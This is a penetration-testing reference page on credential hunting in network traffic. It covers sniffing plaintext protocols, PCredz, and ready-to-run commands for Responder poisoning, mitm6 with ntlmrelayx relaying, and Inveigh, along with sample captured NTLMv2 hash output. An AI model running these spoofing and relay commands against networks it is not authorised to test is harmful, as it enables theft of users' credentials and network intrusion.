---
title: "Credential Hunting in Network Traffic"
description: "Capturing credentials from network traffic using Wireshark, tcpdump, Responder, and PCredz."
tags:
  - password-attacks
  - credential-hunting
  - network-traffic
  - wireshark
  - responder
  - pcredz
icon: material/lan-disconnect
---

# 📡 Credential Hunting in Network Traffic

When networks are improperly segmented or use unencrypted protocols, credentials traverse the network in plaintext or as easily crackable hashes. Monitoring network traffic is a passive, stealthy way to harvest credentials without ever touching a target host.

---

## 1️⃣ Sniffing Plaintext Protocols

Many legacy and internal services still transmit data without encryption (no TLS/SSL). If you are in a position to sniff traffic (e.g., via ARP spoofing, a compromised router, or spanning port), you can capture these credentials directly.

### Vulnerable Protocols:
- **HTTP:** Basic Auth or form data sent over port 80.
- **FTP:** Commands `USER` and `PASS` are sent in cleartext (port 21).
- **Telnet:** Entire session is cleartext (port 23).
- **POP3 / IMAP / SMTP:** Legacy email protocols without STARTTLS (ports 110, 143, 25).
- **LDAP:** Simple binds over port 389 (instead of LDAPS on 636).

### Using Wireshark

If you have a PCAP file, you can filter for credentials in Wireshark:

- `http.request.method == "POST"` (Look for form data)
- `ftp.request.command == "PASS"`
- `telnet` (Right-click -> Follow TCP Stream)

### Using PCredz
**PCredz** is an excellent tool that automatically extracts credit card numbers, POP, SMTP, IMAP, SNMP community strings, FTP, HTTP, and NTLM hashes from a live interface or a PCAP file.

```bash
# Extract from a PCAP file
python3 Pcredz -f capture.pcap

# Listen on a live interface
sudo python3 Pcredz -i eth0
```

---

## 2️⃣ Capturing NTLM Hashes (Responder)

In Windows environments, machines constantly communicate over the local network using broadcast protocols like **LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service).

When a user tries to access a non-existent network share (e.g., `\\fileservr\share` instead of `\\fileserver\share`), Windows broadcasts a request to the local network asking, "Does anyone know who 'fileservr' is?"

**Responder** listens for these broadcasts, claims to be the missing server, and forces the victim machine to authenticate to it, capturing their NetNTLMv2 hash in the process.

### Running Responder
```bash
sudo responder -I eth0 -dwv
```

Once a user types a mistyped share name, Responder captures the hash:
```text
[SMB] NTLMv2-SSP Client   : 10.10.10.25
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:AABBCCDDEEFF...
```

You can then take this NetNTLMv2 hash and crack it offline using Hashcat (Mode 5600).

*(Note: NetNTLMv2 hashes **cannot** be used for Pass the Hash. They must be cracked or relayed).*

---

## 3️⃣ IPv6 DHCP Spoofing (mitm6)

Modern Windows machines prefer IPv6 over IPv4. However, most internal networks don't configure IPv6 DNS.

**mitm6** acts as a rogue IPv6 DHCP server. It assigns IPv6 addresses to Windows machines and sets itself as the primary IPv6 DNS server. It then redirects authentication traffic (like WPAD requests) to an attacker-controlled service (like Responder or ntlmrelayx).

### Running mitm6
```bash
# Run mitm6 on the target domain
sudo mitm6 -d corp.local

# In a separate terminal, run ntlmrelayx or Responder (configured to ignore specific protocols) to catch the hashes
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.10 -wh attacker-wpad -l lootdir
```

---

## 4️⃣ Passive Hash Capture (Inveigh)

If you have a foothold on a Windows machine but cannot install Python or run Responder, you can use **Inveigh**, a PowerShell-based LLMNR/NBT-NS/mDNS/DNS/DHCPv6 spoofer and Man-in-the-Middle tool.

### Running Inveigh
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
```

Inveigh operates entirely in memory and is an excellent "Living off the Land" alternative to Responder.

---

!!! warning
    **ARP Spoofing, DHCP Spoofing, and running Responder actively interfere with network traffic. These actions can cause network instability or break legitimate authentication flows. Use them carefully.**
